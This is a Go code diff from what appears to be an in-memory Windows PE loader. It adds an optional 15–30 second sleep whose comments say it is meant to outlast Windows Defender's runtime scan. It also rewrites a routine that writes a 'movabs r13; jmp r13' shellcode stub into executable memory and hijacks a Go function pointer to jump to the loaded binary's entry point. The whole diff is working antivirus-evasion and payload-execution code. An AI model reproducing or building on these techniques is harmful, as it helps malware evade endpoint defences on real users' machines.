@@ -251,7 +251,7 @@ func FixingHardcodedOffsets(api WinAPI, bin BinAPI) {
 	}
 }
 
-func StartThreadWait(api WinAPI, bin BinAPI) (err error) {
+func StartThreadWait(api WinAPI, bin BinAPI, sleep bool) (err error) {
 
 	entryPoint := bin.GetEntryPoint()
 	log.Infof("Getting entry point %x", entryPoint)
@@ -262,8 +262,10 @@ func StartThreadWait(api WinAPI, bin BinAPI) (err error) {
 		return err
 	}
 
-	log.Infof("Waiting a few seconds to avoid runtime scan")
-	time.Sleep(time.Duration(randInt(15, 30)) * time.Second) // Windows Defender gives up after 15 seconds
+	if sleep {
+		log.Infof("Waiting a few seconds to avoid runtime scan")
+		time.Sleep(time.Duration(randInt(15, 30)) * time.Second) // Windows Defender gives up after 15 seconds
+	}
 
 	api.ResumeThread(r1)
 	api.WaitForSingleObject(r1)
@@ -273,29 +275,24 @@ func StartThreadWait(api WinAPI, bin BinAPI) (err error) {
 }
 
 func PrepareJumper(api WinAPI, entryPoint Pointer) (Pointer, error) {
-	opcode := fmt.Sprintf("48B8%xffd0", intToByteArray(ptrValue(entryPoint)))
+	// movabs r13, entrypoint
+	// jmp r13
+	opcode := fmt.Sprintf("49Bd%x41ffe5", formatPtr(ptrOffset(entryPoint, 0)))
 
 	sc, err := hex.DecodeString(opcode)
 	if err != nil {
 		return nil, err
 	}
-	addr, err := api.VirtualAlloc(16)
+	addr, err := api.VirtualAlloc(uint(len(sc)))
 	if err != nil {
 		return nil, err
 	}
-	if err = api.VirtualProtect(ptrValue(addr), 16, false, true); err != nil {
-		return nil, err
-	}
-	api.Memcopy(uintptr(Pointer(&sc[0])), ptrValue(addr), uintptr(len(sc)))
-
-	if err = api.VirtualProtect(ptrValue(addr), 16, true, false); err != nil {
-		return nil, err
-	}
+	err = api.UpdateExecMemory(ptrValue(addr), sc)
 
 	return addr, err
 }
 
-func StartThread(api WinAPI, bin BinAPI) (err error) {
+func ExecuteInFunction(api WinAPI, bin BinAPI) (err error) {
 	f := func() {}
 	entryPoint := bin.GetEntryPoint()
 	addr, err := PrepareJumper(api, entryPoint)
@@ -310,9 +307,6 @@ func StartThread(api WinAPI, bin BinAPI) (err error) {
 
 	**(**uintptr)(Pointer(&f)) = (uintptr)(addr)
 	log.Debugf("Overwrote function address at 0x%x with stub address 0x%x", *(*uintptr)(Pointer(&f)), addr)
-
-	//fmt.Fprintln(os.Stdin, "coffee")
-	//os.Stdin.WriteString("coffee")
 
 	log.Infof("Executing function at 0x%x", *(*uintptr)(Pointer(&f)))
 	f()
